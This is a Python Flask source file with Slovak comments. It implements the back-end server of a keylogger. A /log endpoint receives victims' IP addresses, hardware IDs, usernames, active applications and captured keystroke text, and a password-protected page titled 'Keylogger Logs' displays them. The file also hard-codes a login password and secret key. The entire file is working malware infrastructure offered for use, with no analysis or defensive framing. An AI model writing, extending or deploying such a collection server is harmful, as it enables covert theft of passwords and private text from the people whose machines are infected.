from flask import Flask, request, redirect, url_for, session, render_template_string
from datetime import timedelta

app = Flask(__name__)
app.secret_key = "120202810428Jm!"  # Toto heslo si môžeš zmeniť
app.permanent_session_lifetime = timedelta(hours=12)

LOGIN_PASSWORD = "120202810428Jm!"  # Heslo pre prístup k logom

logs = []

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Keylogger Logs</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #0f0; padding: 6px; text-align: left; }
    </style>
</head>
<body>
    <h2>📋 Prijaté logy</h2>
    <table>
        <tr>
            <th>IP</th>
            <th>HWID</th>
            <th>Používateľ</th>
            <th>Aplikácia</th>
            <th>Text</th>
        </tr>
        {% for log in logs %}
        <tr>
            <td>{{ log['ip'] }}</td>
            <td>{{ log['hwid'] }}</td>
            <td>{{ log['user'] }}</td>
            <td>{{ log['app'] }}</td>
            <td>{{ log['text'] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

LOGIN_FORM = """
<form method="POST">
    <h2>🔐 Zadaj heslo pre prístup:</h2>
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == LOGIN_PASSWORD:
            session.permanent = True
            session["logged_in"] = True
            return redirect(url_for("view_logs"))
    return LOGIN_FORM

@app.route("/logs")
def view_logs():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template_string(HTML_PAGE, logs=logs)

@app.route("/log", methods=["POST"])
def receive_log():
    data = request.get_json()
    if not data:
        return "No data", 400

    logs.append({
        "ip": data.get("ip", "unknown"),
        "hwid": data.get("hwid", "unknown"),
        "user": data.get("user", "unknown"),
        "app": extract_app_from_log(data.get("logs", [])),
        "text": clean_text(data.get("logs", []))
    })

    return "OK", 200

@app.route("/log", methods=["GET"])
def log_get():
    return "POST endpoint tu"

def extract_app_from_log(log_list):
    for item in log_list:
        if isinstance(item, str) and item.startswith("[") and "]" in item:
            return item.strip("[]")
    return "unknown"

def clean_text(log_list):
    return ''.join([str(i) for i in log_list if not str(i).startswith("[")])

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
